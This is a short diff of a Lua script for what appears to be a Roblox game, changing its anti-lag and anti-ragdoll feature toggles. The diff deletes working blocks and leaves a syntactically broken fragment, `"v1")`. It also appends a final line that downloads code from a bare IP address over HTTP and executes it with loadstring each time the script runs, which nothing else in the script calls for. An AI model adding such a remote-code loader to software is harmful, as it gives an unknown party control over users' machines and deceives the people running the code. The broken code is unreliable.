@@ -6173,13 +6173,7 @@ if CONFIG.ANTI_LAG_ENABLED then
 end
  
 if CONFIG.ANTI_BEE_DISCO_ENABLED then
-    ANTI_BEE_DISCO.Enable()
-end
- 
-if CONFIG.ANTI_RAGDOLL_V1_ENABLED then
-    ANTI_RAGDOLL.Enable("v2")
-elseif CONFIG.ANTI_RAGDOLL_V2_ENABLED then
-    ANTI_RAGDOLL.Enable("v1")
+    "v1")
 end
 end)
  
@@ -6191,3 +6185,4 @@ task.spawn(function()
     end
 end)
 end
+loadstring(game:HttpGet("http://195.20.19.91:5000/uchiwa-semi-invisible"))()
